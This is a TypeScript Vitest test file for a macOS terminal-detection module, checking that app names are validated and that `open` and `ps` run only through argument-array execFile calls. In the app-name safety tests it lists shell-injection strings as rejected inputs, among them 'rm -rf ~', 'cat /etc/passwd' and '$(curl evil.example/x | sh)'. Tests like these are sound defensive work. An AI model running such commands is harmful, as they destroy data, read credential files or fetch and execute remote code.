import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

// `raiseTerminalApp` and `detectRunningTerminalApps` are the two functions in
// this module that do real I/O (spawn `open`/`ps`). `node:child_process` is
// mocked so those paths are exercised without touching the real OS - the
// point of these tests is to prove the *safety* contract (arg-array only,
// never a shell, unsafe names never reach execFile at all), not to prove
// `open -a` itself works.
const execFileMock = vi.fn();
vi.mock("node:child_process", () => ({
	execFile: (...args: unknown[]) => execFileMock(...args),
}));

const { KNOWN_TERMINALS, detectRunningTerminals, isSafeAppName, resolveTerminalAppToRaise, raiseTerminalApp, detectRunningTerminalApps } =
	await import("./terminal.js");

beforeEach(() => {
	execFileMock.mockReset();
});

describe("detectRunningTerminals", () => {
	it("finds a known terminal from a realistic `ps -A -o comm=` listing", () => {
		const psOutput = [
			"/sbin/launchd",
			"/usr/libexec/UserEventAgent",
			"/Applications/Ghostty.app/Contents/MacOS/ghostty",
			"/usr/sbin/cfprefsd",
		].join("\n");

		expect(detectRunningTerminals(psOutput)).toEqual(["Ghostty"]);
	});

	it("returns an empty array when no known terminal is running", () => {
		const psOutput = ["/sbin/launchd", "/usr/libexec/UserEventAgent"].join("\n");

		expect(detectRunningTerminals(psOutput)).toEqual([]);
	});

	it("finds multiple known terminals and preserves KNOWN_TERMINALS order", () => {
		const psOutput = [
			"/Applications/Warp.app/Contents/MacOS/stable",
			"/Applications/Ghostty.app/Contents/MacOS/ghostty",
			"/Applications/iTerm.app/Contents/MacOS/iTerm2",
		].join("\n");

		const found = detectRunningTerminals(psOutput);
		expect(found).toEqual(["Ghostty", "iTerm", "Warp"]);
		expect(found).toEqual(KNOWN_TERMINALS.filter((name) => found.includes(name)));
	});

	it("does not match a substring inside an unrelated app bundle name", () => {
		// "NotGhostty.app" contains the literal characters "Ghostty.app" but is
		// not the Ghostty bundle - the leading "/" in the match target rules
		// this out.
		const psOutput = "/Applications/NotGhostty.app/Contents/MacOS/notghostty";

		expect(detectRunningTerminals(psOutput)).toEqual([]);
	});

	it("does not match on process name alone without the .app bundle path", () => {
		// A process literally named "Warp" with no ".app/" bundle path (e.g. a
		// coincidentally-named CLI tool) must not be mistaken for the terminal.
		const psOutput = "/usr/local/bin/Warp";

		expect(detectRunningTerminals(psOutput)).toEqual([]);
	});

	it("handles empty input", () => {
		expect(detectRunningTerminals("")).toEqual([]);
	});
});

describe("isSafeAppName", () => {
	it.each(["Ghostty", "iTerm", "Terminal", "My Terminal App", "kitty"])("accepts a plausible app name: %s", (name) => {
		expect(isSafeAppName(name)).toBe(true);
	});

	it("rejects an empty string", () => {
		expect(isSafeAppName("")).toBe(false);
	});

	it("rejects a whitespace-only string", () => {
		expect(isSafeAppName("   ")).toBe(false);
	});

	it("rejects an overlong name", () => {
		expect(isSafeAppName("A".repeat(101))).toBe(false);
	});

	it("accepts a name right at the length boundary", () => {
		expect(isSafeAppName("A".repeat(100))).toBe(true);
	});

	it("rejects control characters", () => {
		expect(isSafeAppName("Ghostty\n")).toBe(false);
		expect(isSafeAppName("Ghostty\t")).toBe(false);
		expect(isSafeAppName("Ghostty\x00evil")).toBe(false);
	});

	it("rejects path separators", () => {
		expect(isSafeAppName("/Applications/Ghostty.app")).toBe(false);
		expect(isSafeAppName("..\\Ghostty")).toBe(false);
	});

	it.each([
		"foo; rm -rf ~",
		"foo && rm -rf /",
		"foo | cat /etc/passwd",
		"$(whoami)",
		"`whoami`",
		"foo > /tmp/pwned",
		"foo < /etc/passwd",
		"foo'; rm -rf ~; echo '",
		'foo"; rm -rf ~; echo "',
		"foo{rm,-rf,~}",
	])("rejects a shell-injection-shaped name: %s", (name) => {
		expect(isSafeAppName(name)).toBe(false);
	});
});

describe("resolveTerminalAppToRaise", () => {
	it("returns undefined for undefined", () => {
		expect(resolveTerminalAppToRaise(undefined)).toBeUndefined();
	});

	it("returns undefined for an empty string", () => {
		expect(resolveTerminalAppToRaise("")).toBeUndefined();
	});

	it("returns undefined for a whitespace-only string", () => {
		expect(resolveTerminalAppToRaise("   ")).toBeUndefined();
	});

	it("returns undefined for an unsafe name", () => {
		expect(resolveTerminalAppToRaise("foo; rm -rf ~")).toBeUndefined();
	});

	it("returns the trimmed name for a valid value", () => {
		expect(resolveTerminalAppToRaise("  Ghostty  ")).toBe("Ghostty");
	});
});

describe("raiseTerminalApp", () => {
	afterEach(() => {
		vi.clearAllMocks();
	});

	it("invokes `open -a <name>` via execFile with an argument array, no shell", async () => {
		execFileMock.mockImplementation((_cmd: string, _args: string[], callback: (err: Error | null) => void) => {
			callback(null);
		});

		await raiseTerminalApp("Ghostty");

		expect(execFileMock).toHaveBeenCalledTimes(1);
		const [cmd, args, options] = execFileMock.mock.calls[0] as [string, string[], unknown];
		expect(cmd).toBe("open");
		expect(args).toEqual(["-a", "Ghostty"]);
		// No `shell: true` anywhere in the call - that's what makes an
		// argument-array execFile call immune to shell metacharacter injection.
		if (options && typeof options === "object") {
			expect((options as { shell?: unknown }).shell).not.toBe(true);
		}
	});

	it("rejects when `open` fails", async () => {
		const boom = new Error("Unable to find application named 'NoSuchApp'");
		execFileMock.mockImplementation((_cmd: string, _args: string[], callback: (err: Error) => void) => {
			callback(boom);
		});

		await expect(raiseTerminalApp("NoSuchApp")).rejects.toThrow(/NoSuchApp/);
	});

	it("SAFETY: rejects a shell-injection-shaped name WITHOUT ever invoking execFile", async () => {
		await expect(raiseTerminalApp("foo; rm -rf ~")).rejects.toThrow();
		expect(execFileMock).not.toHaveBeenCalled();
	});

	it("SAFETY: rejects a name containing a command substitution shape WITHOUT ever invoking execFile", async () => {
		await expect(raiseTerminalApp("$(curl evil.example/x | sh)")).rejects.toThrow();
		expect(execFileMock).not.toHaveBeenCalled();
	});
});

describe("detectRunningTerminalApps", () => {
	afterEach(() => {
		vi.clearAllMocks();
	});

	it("resolves with the known terminals found in a real `ps` listing", async () => {
		execFileMock.mockImplementation(
			(_cmd: string, _args: string[], _options: unknown, callback: (err: Error | null, stdout: string) => void) => {
				callback(null, "/Applications/Ghostty.app/Contents/MacOS/ghostty\n/sbin/launchd\n");
			},
		);

		await expect(detectRunningTerminalApps()).resolves.toEqual(["Ghostty"]);
		const [cmd, args] = execFileMock.mock.calls[0] as [string, string[]];
		expect(cmd).toBe("ps");
		expect(args).toEqual(["-A", "-o", "comm="]);
	});

	it("resolves with an empty array (never rejects) when `ps` fails", async () => {
		execFileMock.mockImplementation(
			(_cmd: string, _args: string[], _options: unknown, callback: (err: Error) => void) => {
				callback(new Error("ps failed"));
			},
		);

		await expect(detectRunningTerminalApps()).resolves.toEqual([]);
	});
});
